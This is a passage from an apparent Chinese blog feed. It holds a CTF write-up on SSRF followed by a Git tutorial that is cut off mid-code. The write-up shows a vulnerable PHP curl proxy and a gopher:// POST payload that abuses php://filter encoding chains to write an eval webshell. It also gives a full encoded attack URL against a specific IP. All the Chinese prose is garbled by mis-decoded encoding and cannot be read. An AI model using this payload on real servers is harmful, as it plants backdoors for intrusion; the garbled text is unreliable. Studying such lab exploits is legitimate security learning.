half_infiltration</p><p>é€šè¿‡å‰é¢ä¸€ç³»åˆ—æ“ä½œè·å¾— ssrf.php</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//ç»è¿‡æ‰«æç¡®è®¤35000ä»¥ä¸‹ç«¯å£ä»¥åŠ50000ä»¥ä¸Šç«¯å£ä¸å­˜åœ¨ä»»ä½•å†…ç½‘æœåŠ¡,è¯·ç»§ç»­æ¸—é€å†…ç½‘</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;we_have_done_ssrf_here_could_you_help_to_continue_it&#x27;</span>] ?? <span class="literal">false</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|var|apache|conf|proc|log/i&quot;</span> ,<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">    &#123; </span><br><span class="line">            <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">     &#125; </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div><p>è·‘ç«¯å£ 40000 è·‘å‡ºæ¥ä¸ªç™»å½•æ¡†ï¼Œç„¶åæœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œå‚æ•° file å’Œ content æ˜¯ä¸Šä¼ æ–‡ä»¶</p><p>äºæ˜¯ç”¨ gopher åè®®å‘é€ä¸€ä¸ª POST è¯·æ±‚å†™é©¬ï¼Œpayload å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cookie: PHPSESSID=bv2afbkkbbpgkio8tjmai40ob7</span><br><span class="line">Content-Length: 174</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">file=php://filter/%2577rite=string.rot13|convert.Base64-decode|convert.iconv.utf-7.utf-8/resource=1.php&amp;content=K0FEdz9waHAgZXZhbCgrQUNRQVh3LUdFVCtBRnMtMCtBRjApK0FEcz8rQUQ0LQ</span><br></pre></td></tr></table></figure></div><p>æœ€å payload å¦‚ä¸‹ï¼Œä¼ å…¥å‚æ•°éœ€è¦æ³¨æ„äºŒæ¬¡ url ç¼–ç ï¼š</p><p><code>http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%2520/index.php%2520HTTP/1.1%250AHost%253A%2520127.0.0.1%250ACookie%253A%2520PHPSESSID%253Dbv2afbkkbbpgkio8tjmai40ob7%250AContent-Length%253A%2520174%250AContent-Type%253A%2520application/x-www-form-urlencoded%250AConnection%253A%2520close%250d%250A%250Afile%253Dphp%253A//filter/%25252577rite%253Dstring.rot13%257Cconvert.Base64-decode%257Cconvert.iconv.utf-7.utf-8/resource%253D1.php%2526content%253DK0FEdz9waHAgZXZhbCgrQUNRQVh3LUdFVCtBRnMtMCtBRjApK0FEcz8rQUQ0LQ</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ssrf&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ssrf&quot;&gt;#&lt;/a&gt; SSRF&lt;/h1&gt;
&lt;h2 id=&quot;dasctf-x-gfctf-2024-easysignin&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Git&amp;Docker</title>
    <link href="http://example.com/2024/04/16/Git-Docker/"/>
    <id>http://example.com/2024/04/16/Git-Docker/</id>
    <published>2024-04-16T01:58:59.000Z</published>
    <updated>2024-04-17T04:30:39.200Z</updated>
    
    <content type="html"><![CDATA[<h1 id="git"><a class="markdownIt-Anchor" href="#git">#</a> Git</h1><h2 id="ç‰ˆæœ¬æ§åˆ¶"><a class="markdownIt-Anchor" href="#ç‰ˆæœ¬æ§åˆ¶">#</a> ç‰ˆæœ¬æ§åˆ¶</h2><h3 id="ä»‹ç»"><a class="markdownIt-Anchor" href="#ä»‹ç»">#</a> ä»‹ç»</h3><h4 id="1ä»€ä¹ˆæ˜¯ç‰ˆæœ¬æ§åˆ¶"><a class="markdownIt-Anchor" href="#1ä»€ä¹ˆæ˜¯ç‰ˆæœ¬æ§åˆ¶">#</a> 1. ä»€ä¹ˆæ˜¯ç‰ˆæœ¬æ§åˆ¶</h4><p>â€‹ç‰ˆæœ¬æ§åˆ¶ï¼ˆRevision controlï¼‰æ˜¯ä¸€ç§åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ç”¨äºç®¡ç†æˆ‘ä»¬å¯¹æ–‡ä»¶ã€ç›®å½•æˆ–å·¥ç¨‹ç­‰å†…å®¹çš„ä¿®æ”¹å†å²ï¼Œæ–¹ä¾¿æŸ¥çœ‹æ›´æ”¹å†å²è®°å½•ï¼Œå¤‡ä»½ä»¥ä¾¿æ¢å¤ä»¥å‰çš„ç‰ˆæœ¬çš„è½¯ä»¶å·¥ç¨‹æŠ€æœ¯ã€‚ç®€å•æ¥è¯´å°±æ˜¯ç”¨äºç®¡ç†å¤šäººååŒå¼€å‘é¡¹ç›®çš„æŠ€æœ¯ã€‚ <strong>ç‰ˆæœ¬è¿­ä»£</strong></p><h4 id="2ä¸ºä»€ä¹ˆè¦æœ‰ç‰ˆæœ¬æ§åˆ¶"><a class="markdownIt-Anchor" href="#2ä¸ºä»€ä¹ˆè¦æœ‰ç‰ˆæœ¬æ§åˆ¶">#</a> 2. ä¸ºä»€ä¹ˆè¦æœ‰ç‰ˆæœ¬æ§åˆ¶ï¼Ÿ</h4><p>â€‹    æ²¡æœ‰è¿›è¡Œç‰ˆæœ¬æ§åˆ¶æˆ–è€…ç‰ˆæœ¬æ§åˆ¶æœ¬èº«ç¼ºä¹æ­£ç¡®çš„æµç¨‹ç®¡ç†ï¼Œåœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­å°†ä¼šå¼•å…¥å¾ˆå¤šé—®é¢˜ï¼Œå¦‚è½¯ä»¶ä»£ç çš„ä¸€è‡´æ€§ã€è½¯ä»¶å†…å®¹çš„å†—ä½™ã€è½¯ä»¶è¿‡ç¨‹çš„äº‹ç‰©æ€§ã€è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­çš„å¹¶å‘æ€§ã€è½¯ä»¶æºä»£ç çš„å®‰å…¨æ€§ï¼Œä»¥åŠè½¯ä»¶çš„æ•´åˆç­‰é—®é¢˜ã€‚æ— è®ºæ˜¯å·¥ä½œè¿˜æ˜¯å­¦ä¹ ï¼Œæˆ–è€…æ˜¯è‡ªå·±åšç¬”è®°ï¼Œéƒ½ç»å†è¿‡è¿™æ ·ä¸€ä¸ªé˜¶æ®µï¼æˆ‘ä»¬å°±è¿«åˆ‡éœ€è¦ä¸€ä¸ªç‰ˆæœ¬æ§åˆ¶å·¥å…·ã€‚ï¼ˆå¤šäººå¼€å‘å°±å¿…é¡»è¦ä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶ï¼‰<br>â€‹    ä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶ä¹‹åå¯ä»¥ç»™ä½ å¸¦æ¥çš„ä¸€äº›ä¾¿åˆ©ï¼š</p><blockquote><p>â— å®ç°è·¨åŒºåŸŸå¤šäººååŒå¼€å‘<br>â— è¿½è¸ªå’Œè®°è½½ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ–‡ä»¶çš„å†å²è®°å½•<br>â— ç»„ç»‡å’Œä¿æŠ¤ä½ çš„æºä»£ç å’Œæ–‡æ¡£<br>â— ç»Ÿè®¡å·¥ä½œé‡<br>â— å¹¶è¡Œå¼€å‘ã€æé«˜å¼€å‘æ•ˆç‡<br>â— è·Ÿè¸ªè®°å½•æ•´ä¸ªè½¯ä»¶çš„å¼€å‘è¿‡ç¨‹<br>â— å‡è½»å¼€å‘äººå‘˜çš„è´Ÿæ‹…ï¼ŒèŠ‚çœæ—¶é—´ï¼ŒåŒæ—¶é™ä½äººä¸ºé”™è¯¯</p></blockquote><h4 id="3å¸¸è§ç‰ˆæœ¬æ§åˆ¶å·¥å…·"><a class="markdownIt-Anchor" href="#3å¸¸è§ç‰ˆæœ¬æ§åˆ¶å·¥å…·">#</a> 3. å¸¸è§ç‰ˆæœ¬æ§åˆ¶å·¥å…·</h4><p>ä¸»æµçš„ç‰ˆæœ¬æ§åˆ¶å™¨æœ‰å¦‚ä¸‹è¿™äº›ï¼š</p><blockquote><p>â— <strong>Git</strong><br>â— SVNï¼ˆSubversionï¼‰<br>â— CVSï¼ˆConcurrent Versions Systemï¼‰<br>â— VSSï¼ˆMicorosoft Visual SourceSafeï¼‰<br>â— TFSï¼ˆTeam Foundation Serverï¼‰<br>â— Visual Studio Online</p></blockquote><p>ç‰ˆæœ¬æ§åˆ¶äº§å“éå¸¸çš„å¤šï¼ˆPerforceã€Rational ClearCaseã€RCSï¼ˆGNU Revision Control Systemï¼‰ã€Serena Dimentionã€SVKã€BitKeeperã€Monotoneã€Bazaarã€Mercurialã€SourceGear Vaultï¼‰ï¼Œç°åœ¨å½±å“åŠ›æœ€å¤§ä¸”ä½¿ç”¨æœ€å¹¿æ³›çš„æ˜¯ Git ä¸ SVN</p><h3 id="åˆ†ç±»"><a class="markdownIt-Anchor" href="#åˆ†ç±»">#</a> åˆ†ç±»</h3><h4 id="1æœ¬åœ°ç‰ˆæœ¬æ§åˆ¶"><a class="markdownIt-Anchor" href="#1æœ¬åœ°ç‰ˆæœ¬æ§åˆ¶">#</a> 1. æœ¬åœ°ç‰ˆæœ¬æ§åˆ¶</h4><p>è®°å½•æ–‡ä»¶æ¯æ¬¡çš„æ›´æ–°ï¼Œå¯ä»¥å¯¹æ¯ä¸ªç‰ˆæœ¬åšä¸€ä¸ªå¿«ç…§ï¼Œæˆ–æ˜¯è®°å½•è¡¥ä¸æ–‡ä»¶ï¼Œé€‚åˆä¸ªäººç”¨ï¼Œå¦‚ RCSã€‚</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/7OWankz9bgmRxvZ.png" alt="image.png"></p><h4 id="2é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶-svn"><a class="markdownIt-Anchor" href="#2é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶-svn">#</a> 2. é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ ï¼ˆSVNï¼‰</h4><p>æ‰€æœ‰çš„ç‰ˆæœ¬æ•°æ®éƒ½ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šï¼ŒååŒå¼€å‘è€…ä»æœåŠ¡å™¨ä¸ŠåŒæ­¥æ›´æ–°æˆ–ä¸Šä¼ è‡ªå·±çš„ä¿®æ”¹ã€‚</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/EvP4MYdpjqthKH1.png" alt="image.png"></p><p>æ‰€æœ‰çš„ç‰ˆæœ¬æ•°æ®éƒ½å­˜åœ¨æœåŠ¡å™¨ä¸Šï¼Œç”¨æˆ·çš„æœ¬åœ°åªæœ‰è‡ªå·±ä»¥å‰æ‰€åŒæ­¥çš„ç‰ˆæœ¬ï¼Œå¦‚æœä¸è¿ç½‘çš„è¯ï¼Œç”¨æˆ·å°±çœ‹ä¸åˆ°å†å²ç‰ˆæœ¬ï¼Œä¹Ÿæ— æ³•åˆ‡æ¢ç‰ˆæœ¬éªŒè¯é—®é¢˜ï¼Œæˆ–åœ¨ä¸åŒåˆ†æ”¯å·¥ä½œã€‚è€Œä¸”ï¼Œæ‰€æœ‰æ•°æ®éƒ½ä¿å­˜åœ¨å•ä¸€çš„æœåŠ¡å™¨ä¸Šï¼Œæœ‰å¾ˆå¤§çš„é£é™©è¿™ä¸ªæœåŠ¡å™¨ä¼šæŸåï¼Œè¿™æ ·å°±ä¼šä¸¢å¤±æ‰€æœ‰çš„æ•°æ®ï¼Œå½“ç„¶å¯ä»¥å®šæœŸå¤‡ä»½ã€‚ä»£è¡¨äº§å“ï¼šSVNã€CVSã€VSSã€‚</p><h4 id="3åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶-git"><a class="markdownIt-Anchor" href="#3åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶-git">#</a> 3. åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ ï¼ˆGitï¼‰</h4><p>æ¯ä¸ªäººéƒ½æœ‰å…¨éƒ¨ä»£ç ï¼Œæ‰€ä»¥æœ‰ä¸€å®šé£é™©</p><p>æ‰€æœ‰ç‰ˆæœ¬ä¿¡æ¯ä»“åº“å…¨éƒ¨åŒæ­¥åˆ°æœ¬åœ°çš„æ¯ä¸ªç”¨æˆ·ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœ¬åœ°æŸ¥çœ‹æ‰€æœ‰ç‰ˆæœ¬å†å²ï¼Œå¯ä»¥ç¦»çº¿åœ¨æœ¬åœ°æäº¤ï¼Œåªéœ€åœ¨è¿ç½‘æ—¶ push åˆ°ç›¸åº”çš„æœåŠ¡å™¨æˆ–å…¶ä»–ç”¨æˆ·é‚£é‡Œã€‚ç”±äºæ¯ä¸ªç”¨æˆ·é‚£é‡Œä¿å­˜çš„éƒ½æ˜¯æ‰€æœ‰çš„ç‰ˆæœ¬æ•°æ®ï¼Œåªè¦æœ‰ä¸€ä¸ªç”¨æˆ·çš„è®¾å¤‡æ²¡æœ‰é—®é¢˜å°±å¯ä»¥æ¢å¤æ‰€æœ‰çš„æ•°æ®ï¼Œä½†è¿™å¢åŠ äº†æœ¬åœ°å­˜å‚¨ç©ºé—´çš„å ç”¨ã€‚</p><p>ä¸ä¼šå› ä¸ºæœåŠ¡å™¨æŸåæˆ–è€…ç½‘ç»œé—®é¢˜é€ æˆä¸èƒ½å·¥ä½œçš„æƒ…å†µ</p><h3 id="gitå’Œsvnçš„åŒºåˆ«"><a class="markdownIt-Anchor" href="#gitå’Œsvnçš„åŒºåˆ«">#</a> Git å’Œ SVN çš„åŒºåˆ«</h3><p>â€‹SVN æ˜¯<strong>é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</strong>ï¼Œç‰ˆæœ¬åº“æ˜¯é›†ä¸­æ”¾åœ¨<strong>ä¸­å¤®æœåŠ¡å™¨</strong>çš„ï¼Œè€Œå·¥ä½œçš„æ—¶å€™ï¼Œç”¨çš„éƒ½æ˜¯è‡ªå·±çš„ç”µè„‘ï¼Œæ‰€ä»¥é¦–å…ˆè¦ä»ä¸­å¤®æœåŠ¡å™¨å¾—åˆ°æœ€æ–°çš„ç‰ˆæœ¬ï¼Œç„¶åå·¥ä½œï¼Œå®Œæˆå·¥ä½œåï¼Œéœ€è¦æŠŠè‡ªå·±åšå®Œçš„æ´»æ¨é€åˆ°ä¸­å¤®æœåŠ¡å™¨ã€‚é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ˜¯<strong>å¿…é¡»è”ç½‘</strong>æ‰èƒ½å·¥ä½œï¼Œå¯¹ç½‘ç»œå¸¦å®½è¦æ±‚è¾ƒé«˜ã€‚<br>â€‹       Git æ˜¯<strong>åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</strong>ï¼Œ<strong>æ²¡æœ‰ä¸­å¤®æœåŠ¡å™¨</strong>ï¼Œæ¯ä¸ªäººçš„ç”µè„‘å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç‰ˆæœ¬åº“ï¼Œå·¥ä½œçš„æ—¶å€™<strong>ä¸éœ€è¦è”ç½‘</strong>äº†ï¼Œå› ä¸ºç‰ˆæœ¬éƒ½åœ¨è‡ªå·±ç”µè„‘ä¸Šã€‚ååŒçš„æ–¹æ³•æ˜¯è¿™æ ·çš„ï¼šæ¯”å¦‚è¯´è‡ªå·±åœ¨ç”µè„‘ä¸Šæ”¹äº†æ–‡ä»¶ Aï¼Œå…¶ä»–äººä¹Ÿåœ¨ç”µè„‘ä¸Šæ”¹äº†æ–‡ä»¶ Aï¼Œè¿™æ—¶ï¼Œä½ ä»¬ä¸¤ä¹‹é—´åªéœ€æŠŠå„è‡ªçš„ä¿®æ”¹æ¨é€ç»™å¯¹æ–¹ï¼Œå°±å¯ä»¥äº’ç›¸çœ‹åˆ°å¯¹æ–¹çš„ä¿®æ”¹äº†ã€‚Git å¯ä»¥ç›´æ¥çœ‹åˆ°æ›´æ–°äº†å“ªäº›ä»£ç å’Œæ–‡ä»¶ï¼</p><p><strong>Git æ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚</strong></p><h2 id="gitç†è®º"><a class="markdownIt-Anchor" href="#gitç†è®º">#</a> Git ç†è®º</h2><h3 id="å·¥ä½œåŒºåŸŸ"><a class="markdownIt-Anchor" href="#å·¥ä½œåŒºåŸŸ">#</a> å·¥ä½œåŒºåŸŸ</h3><blockquote><ul><li>** å·¥ä½œåŒºï¼ˆworkspaceï¼‰ï¼š** å°±æ˜¯ä½ åœ¨ç”µè„‘é‡Œèƒ½çœ‹åˆ°çš„ç›®å½•ã€‚</li><li>** æš‚å­˜åŒºï¼ˆindexï¼‰ï¼š** è‹±æ–‡å« stage æˆ– indexã€‚ä¸€èˆ¬å­˜æ”¾åœ¨ <strong>.git</strong> ç›®å½•ä¸‹çš„ index æ–‡ä»¶ï¼ˆ.git/indexï¼‰ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠæš‚å­˜åŒºæœ‰æ—¶ä¹Ÿå«ä½œç´¢å¼•ï¼ˆindexï¼‰ã€‚</li><li>** ç‰ˆæœ¬åº“ï¼ˆRepositoryï¼‰ï¼š** å·¥ä½œåŒºæœ‰ä¸€ä¸ªéšè—ç›®å½• <strong>.git</strong>ï¼Œè¿™ä¸ªä¸ç®—å·¥ä½œåŒºï¼Œè€Œæ˜¯ Git çš„ç‰ˆæœ¬åº“ã€‚</li><li><strong>è¿œç¨‹ Git ä»“åº“ï¼ˆRemote)</strong></li></ul></blockquote><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/4wdCj32AFk1QaiZ.png" alt="image.png"></p><h3 id="å·¥ä½œæµç¨‹"><a class="markdownIt-Anchor" href="#å·¥ä½œæµç¨‹">#</a> å·¥ä½œæµç¨‹</h3><blockquote><p>1. åœ¨æœ¬åœ°ç›®å½•æ·»åŠ ã€ä¿®æ”¹æ–‡ä»¶</p><p>2. å°†éœ€è¦è¿›è¡Œç‰ˆæœ¬ç®¡ç†çš„æ–‡ä»¶æ·»åŠ è‡³æš‚å­˜åŒº  //git add .</p><p>3. å°†æš‚å­˜åŒºæ–‡ä»¶æäº¤åˆ° Git ä»“åº“  //git commit</p><p>4. å°†æœ¬åœ°ä»“åº“æ–‡ä»¶æäº¤åˆ°è¿œç¨‹ä»“åº“  //git push</p></blockquote><p>git ç®¡ç†çš„æ–‡ä»¶æœ‰ä¸‰ç§çŠ¶æ€ï¼šå·²ä¿®æ”¹ï¼ˆmodifiedï¼‰ã€å·²æš‚å­˜ï¼ˆstagedï¼‰ã€å·²æäº¤ï¼ˆcommittedï¼‰</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/16/tga7QNjrkfeCIOn.png" alt="image.png"></p><h4 id="æœ¬åœ°é¡¹ç›®æ­å»º"><a class="markdownIt-Anchor" href="#æœ¬åœ°é¡¹ç›®æ­å»º">#</a> æœ¬åœ°é¡¹ç›®æ­å»º</h4><p>1. åˆ›å»ºä¸€ä¸ªå…¨æ–°ä»“åº“</p><p>åˆå§‹åŒ–ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure></div><p>2. å…‹éš†è¿œç¨‹ä»“åº“</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone [url] //https://github.com/Fc04dB/Fc04dB.github.io/tree/main/2024/04</span><br></pre></td></tr></table></figure></div><h3 id="gitæ–‡ä»¶æ“ä½œ"><a class="markdownIt-Anchor" href="#gitæ–‡ä»¶æ“ä½œ">#</a> Git æ–‡ä»¶æ“ä½œ</h3><h4 id="æ–‡ä»¶çŠ¶æ€"><a class="markdownIt-Anchor" href="#æ–‡ä»¶çŠ¶æ€">#</a> æ–‡ä»¶çŠ¶æ€</h4><p>ç‰ˆæœ¬æ§åˆ¶å°±æ˜¯å¯¹æ–‡ä»¶çš„ç‰ˆæœ¬æ§åˆ¶ï¼Œè¦å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€æäº¤ç­‰æ“ä½œï¼Œé¦–å…ˆè¦çŸ¥é“æ–‡ä»¶å½“å‰åœ¨ä»€ä¹ˆçŠ¶æ€ï¼Œä¸ç„¶å¯èƒ½ä¼šæäº¤äº†ç°åœ¨è¿˜ä¸æƒ³æäº¤çš„æ–‡ä»¶ï¼Œæˆ–è€…è¦æäº¤çš„æ–‡ä»¶æ²¡æäº¤ä¸Šã€‚</p><ul><li>Untracked: æœªè·Ÿè¸ªï¼Œæ­¤æ–‡ä»¶åœ¨æ–‡ä»¶å¤¹ä¸­ï¼Œä½†å¹¶æ²¡æœ‰åŠ å…¥åˆ° git åº“ï¼Œä¸å‚ä¸ç‰ˆæœ¬æ§åˆ¶ã€‚é€šè¿‡ git add çŠ¶æ€å˜ä¸º Staged.</li><li>Unmodify: æ–‡ä»¶å·²ç»å…¥åº“ï¼Œæœªä¿®æ”¹ï¼Œå³ç‰ˆæœ¬åº“ä¸­çš„æ–‡ä»¶å¿«ç…§å†…å®¹ä¸æ–‡ä»¶å¤¹ä¸­å®Œå…¨ä¸€è‡´ã€‚è¿™ç§ç±»å‹çš„æ–‡ä»¶æœ‰ä¸¤ç§å»å¤„ï¼Œå¦‚æœå®ƒè¢«ä¿®æ”¹ï¼Œè€Œå˜ä¸º Modified. å¦‚æœä½¿ç”¨ git rm ç§»å‡ºç‰ˆæœ¬åº“ï¼Œåˆ™æˆä¸º Untracked æ–‡ä»¶</li><li>Modified: æ–‡ä»¶å·²ä¿®æ”¹ï¼Œä»…ä»…æ˜¯ä¿®æ”¹ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œå…¶ä»–çš„æ“ä½œã€‚è¿™ä¸ªæ–‡ä»¶ä¹Ÿæœ‰ä¸¤ä¸ªå»å¤„ï¼Œé€šè¿‡ git add å¯è¿›å…¥æš‚å­˜ staged çŠ¶æ€ï¼Œä½¿ç”¨ git checkout åˆ™ä¸¢å¼ƒä¿®æ”¹è¿‡ï¼Œè¿”å›åˆ° unmodify çŠ¶æ€ï¼Œè¿™ä¸ª git checkout å³ä»åº“ä¸­å–å‡ºæ–‡ä»¶ï¼Œè¦†ç›–å½“å‰ä¿®æ”¹ï¼</li><li>Staged: æš‚å­˜çŠ¶æ€ã€‚æ‰§è¡Œ git commit åˆ™å°†ä¿®æ”¹åŒæ­¥åˆ°åº“ä¸­ï¼Œè¿™æ—¶åº“ä¸­çš„æ–‡ä»¶å’Œæœ¬åœ°æ–‡ä»¶åˆå˜ä¸ºä¸€è‡´ï¼Œæ–‡ä»¶ä¸º Unmodify çŠ¶æ€ã€‚æ‰§è¡Œ git reset HEAD filename å–æ¶ˆæš‚å­˜ï¼Œæ–‡ä»¶çŠ¶æ€ä¸º Modified</li></ul><h4 id="æŸ¥çœ‹æ–‡ä»¶çŠ¶æ€"><a class="markdownIt-Anchor" href="#æŸ¥çœ‹æ–‡ä»¶çŠ¶æ€">#</a> æŸ¥çœ‹æ–‡ä»¶çŠ¶æ€</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çŠ¶æ€</span><br><span class="line">git status [filename]</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶çŠ¶æ€</span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"># git add .                  æ·»åŠ æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº</span><br><span class="line"># git commit -m &quot;æ¶ˆæ¯å†…å®¹&quot;    æäº¤æš‚å­˜åŒºä¸­çš„å†…å®¹åˆ°æœ¬åœ°ä»“åº“ -m æäº¤ä¿¡æ¯</span><br></pre></td></tr></table></figure></div><h4 id="å¿½ç•¥æ–‡ä»¶"><a class="markdownIt-Anchor" href="#å¿½ç•¥æ–‡ä»¶">#</a> å¿½ç•¥æ–‡ä»¶</h4><p>æœ‰äº›æ—¶å€™æˆ‘ä»¬ä¸æƒ³æŠŠæŸäº›æ–‡ä»¶çº³å…¥ç‰ˆæœ¬æ§åˆ¶ä¸­ï¼Œæ¯”å¦‚æ•°æ®åº“æ–‡ä»¶ï¼Œä¸´æ—¶æ–‡ä»¶ï¼Œè®¾è®¡æ–‡ä»¶ç­‰</p><p>åœ¨ä¸»ç›®å½•ä¸‹å»ºç«‹ &quot;.gitignore&quot; æ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶æœ‰å¦‚ä¸‹è§„åˆ™ï¼š</p><ol><li>å¿½ç•¥æ–‡ä»¶ä¸­çš„ç©ºè¡Œæˆ–ä»¥äº•å·ï¼ˆ#ï¼‰å¼€å§‹çš„è¡Œå°†ä¼šè¢«å¿½ç•¥ã€‚</li><li>å¯ä»¥ä½¿ç”¨ Linux é€šé…ç¬¦ã€‚ä¾‹å¦‚ï¼šæ˜Ÿå·ï¼ˆ*ï¼‰ä»£è¡¨ä»»æ„å¤šä¸ªå­—ç¬¦ï¼Œé—®å·ï¼ˆï¼Ÿï¼‰ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œæ–¹æ‹¬å·ï¼ˆ[abc]ï¼‰ä»£è¡¨å¯é€‰å­—ç¬¦èŒƒå›´ï¼Œå¤§æ‹¬å·ï¼ˆ{string1,string2,â€¦}ï¼‰ä»£è¡¨å¯é€‰çš„å­—ç¬¦ä¸²ç­‰ã€‚</li><li>å¦‚æœåç§°çš„æœ€å‰é¢æœ‰ä¸€ä¸ªæ„Ÿå¹å·ï¼ˆ!ï¼‰ï¼Œè¡¨ç¤ºä¾‹å¤–è§„åˆ™ï¼Œå°†ä¸è¢«å¿½ç•¥ã€‚</li><li>å¦‚æœåç§°çš„æœ€å‰é¢æ˜¯ä¸€ä¸ªè·¯å¾„åˆ†éš”ç¬¦ï¼ˆ/ï¼‰ï¼Œè¡¨ç¤ºè¦å¿½ç•¥çš„æ–‡ä»¶åœ¨æ­¤ç›®å½•ä¸‹ï¼Œè€Œå­ç›®å½•ä¸­çš„æ–‡ä»¶ä¸å¿½ç•¥ã€‚</li><li>å¦‚æœåç§°çš„æœ€åé¢æ˜¯ä¸€ä¸ªè·¯å¾„åˆ†éš”ç¬¦ï¼ˆ/ï¼‰ï¼Œè¡¨ç¤ºè¦å¿½ç•¥çš„æ˜¯æ­¤ç›®å½•ä¸‹è¯¥åç§°çš„å­ç›®å½•ï¼Œè€Œéæ–‡ä»¶ï¼ˆé»˜è®¤æ–‡ä»¶æˆ–ç›®å½•éƒ½å¿½ç•¥ï¼‰ã€‚</li></ol><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#ä¸ºæ³¨é‡Š</span><br><span class="line">*.txt        #å¿½ç•¥æ‰€æœ‰ .txtç»“å°¾çš„æ–‡ä»¶,è¿™æ ·çš„è¯ä¸Šä¼ å°±ä¸ä¼šè¢«é€‰ä¸­ï¼</span><br><span class="line">!lib.txt     #ä½†lib.txté™¤å¤–</span><br><span 